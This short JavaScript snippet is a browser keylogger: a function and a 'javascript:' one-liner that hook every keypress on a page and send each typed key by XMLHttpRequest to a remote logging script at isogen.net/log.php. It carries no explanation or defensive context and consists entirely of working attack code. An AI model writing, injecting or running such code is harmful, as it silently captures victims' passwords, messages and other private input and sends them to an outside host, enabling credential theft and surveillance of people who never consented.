function(key){
		var xmlHttp = new XMLHttpRequest();
    	xmlHttp.open("GET", "http://isogen.net/log.php?key=" + key, true); 
    	xmlHttp.send(null);
	}



    javascript:style=document.addEventListener("keypress", function(key){this.word="";var xmlHttp = new XMLHttpRequest();xmlHttp.open("GET", "https://isogen.net/log.php?key=" + encodeURI(key.key), true);xmlHttp.send(null);})